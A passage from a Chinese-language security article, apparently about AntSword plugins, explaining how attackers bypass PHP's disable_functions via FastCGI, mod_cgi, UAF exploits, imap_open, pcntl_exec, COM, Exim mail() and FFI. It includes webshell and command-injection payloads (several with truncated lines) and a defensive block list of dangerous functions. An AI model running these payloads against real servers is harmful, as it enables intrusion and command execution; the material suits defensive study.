判断选定的fpm连接方式为Unix Socket还是TCP
紧接着与第一种LD_PRELOAD实现相同，将启动新的PHPServer命令插入代上传的so文件指定字节位置，进行上传
so文件上传成功后，初始化fastcgiclient，构造恶意fastcgi协议连接php-fpm，PHP_VALUE与PHP_ADMIN_VALUE均将extension指向so文件，发送协议后动态加载我们的扩展文件，启动默认配置的PHPServer
最后上传代理脚本，将流量通过index.php转发到新PHPServer，实现绕过disable_function
###  3.Apache Mod CGI
####  利用原理
Mod CGI就是把PHP做为APACHE一个内置模块，让apache
http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP
它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行
在.htaccess文件中可定制用户定义标识头
添加Options +ExecCGI，代表着允许使用mod_cgi模块执行CGI脚本
添加AddHandler cgi-script .cgi，代表着包含.cgi扩展名的文件都将被视为CGI程序
此时需要保证.htaccess可以加载进当前web环境
当apache配置文件中指定web目录下AllowOverride参数值为None 时，.htaccess 文件无法生效
在apache2.3.8版本之前AllowOverride参数值默认设置为 All，.htaccess 文件设置的指令可生效
配置好cgi文件的环境变量后可通过构造如下脚本来实现命令执行
    #! /bin/bash
    echo -ne "Content-Type: text/html\n\n"//发送给浏览器告诉浏览器文件的内容类型,否则500
    whoami
####  插件实现
插件脚本首先判断modcgi是否启用、当前目录是否可写、.htaccess是否可正常使用
备份.htaccess文件并配置好新的.htaccess以及写入cgi脚本文件shell.ant，并赋执行权限
最后启动一个新的终端，将我们输入的命令put进shell.ant对其发起请求，实现命令执行
###  4.Json Serializer UAF && PHP7 GC with Certain Destructors UAF
####  利用原理
php7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令
影响范围是linux，php7.0-7.3
https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php
php-json-bypass漏洞利用json序列化程序中的堆溢出触发，以绕过disable_functions并执行系统命令
影响范围是linux，php 7.1-7.3
https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php
####  插件实现
两插件首先判断系统版本及php版本是否满足使用条件
启新终端，通过PHP7GCUAFEXP()函数、JSONSerializer_UAF()函数传递执行命令
两EXP函数通过调用原作者POC实现
https://github.com/mm0r1/exploits
## 0x03 其他绕过方式
###  1.IMAP Bypass
imap_open()函数需安装imap扩展，用于打开连接某个邮箱的IMAP流
当启用了rsh和ssh功能并且在debian/ubuntu中会默认调用ssh进行连接
    //imap.php
    /tmp/result";
    $encoded_payload = base64_encode($payload);
    $server = "any -o ProxyCommand=echo\t".$encoded_payload."|base64\t-d|bash";
    @imap_open('{'.$server.'}:143/imap}INBOX', '', '');
    echo file_get_contents("/tmp/result");
    ?>
由于未对参数传递进行正确编码，导致ssh建立连接可利用\t代替空格进行-oProxyCommand参数命令拼接，从而调用系统shell执行命令
###  2.PCNTL Bypass
当php安装并使用pcntl扩展时，可借助其pcntlexec()函数直接执行命令来尝试绕过disablefunctions
通过文件读写来达到命令执行回显
     /tmp/output.txt\n";
    file_put_contents($cmd, $c);
    chmod($cmd, 0777);
    $cd = "/tmp/output.txt";
    print_r(file_get_contents($cd));
    switch (pcntl_fork()) {
      case 0:
        $ret = pcntl_exec($cmd);
        exit("case 0");
      default:
        echo "case 1";
        break;
    }
###  3.COM Bypass
该利用方式调用windows的COM组件需要在php.ini中开启并添加extension
    com.allow_dcom = true
    extension = php_com_dotnet.dll
通过COM组件直接调用WScript.shell或Shell.Application执行系统命令
    exec("cmd /c".$command);
        $stdout = $exec->StdOut();
        $stroutput = $stdout->ReadAll();
        echo $stroutput;
    }
    elseif($wsh == 'application') {
        $command = $_GET['cmd'];
        $wshit = new COM("Shell.Application") or die("Shell.Application Failed!");
        $exec = $wshit->ShellExecute("cmd","/c ".$command);
    } 
    else {
      echo(0);
    }
    ?>
###  4.EXIM Bypass
mail()函数的第五个additional_parameters参数可用于设置命令行选项传递给配置为发送邮件时使用的程序
例如，当将sendmail与-C -X 选项一起使用时，可读取文件并输出到指定文件
    //     -C file     Use alternate configuration file.  Sendmail refuses to run as root if an alternate configuration file is specified.
    //     -X logfile  Log all traffic in and out of mailers in the indicated log file.  This should only be used as a last resort for debug-ging mailer bugs.  It will log a lot of data very quickly.
当系统使用Exim4来发送邮件时 -be 参数支持运行扩展模式对指定字符串扩展格式进行解析
    ${run{ }{}{}}
    //执行命令 ，成功返回string1，失败返回string2
    ${substr{}{}{}}
    //字符串的截取，在string3中从string1开始截取string2个字符
使用run进行命令执行，但空格等特殊字符无法识别
借助其substr函数来截取字符串进行替换特殊字符
如，使用substr{13}{1}{$tod_log} 从第14个字符开始截取一个字符为:
substr{10}{1}{$tod_log}第11个字符即为空格
    //From l3m0n
    ' . $result_file;
    file_put_contents($tmp_file, $command);
    $payload = "-be \${run{/bin/bash\${substr{10}{1}{\$tod_log}}/tmp/aaaaaaaaaaa.sh}{ok}{error}}";
    mail("a@localhost", "", "", "", $payload);
    echo file_get_contents($result_file);
    @unlink($tmp_file);
    @unlink($result_file);
    ?>
###  5.FFI Bypass
FFI（Foreign Function Interface）是 PHP7.4 新加入的功能，即外部函数接口，允许从共享库中调用C代码
FFI的使用如下分为声明和调用两个部分
利用ffi来引入libc中的system函数执行命令
## 0x04 如何防御
  1. disable_function禁用参考
    set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl
  2. PHP7使用28 Nov 2019以后版本
  3. 正确设置open_basedir及目录的可写权限
  4. 做好上述插件和组件的配置核查
  5. 使用主机监控和waf对webshell进行检测和敏感操作拦截
## 参考
https://github.com/AntSwordProject/AntSword-Labs
https://blog.1pwnch.com/websecurity/2019/04/08/Bypass-disablefuncs-with-LDPRELOAD/
https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html
> [Hack PHP mail additional_parameters](http://blog.nsfocus.net/hack-php-mail-> additional_parameters/)
https://www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/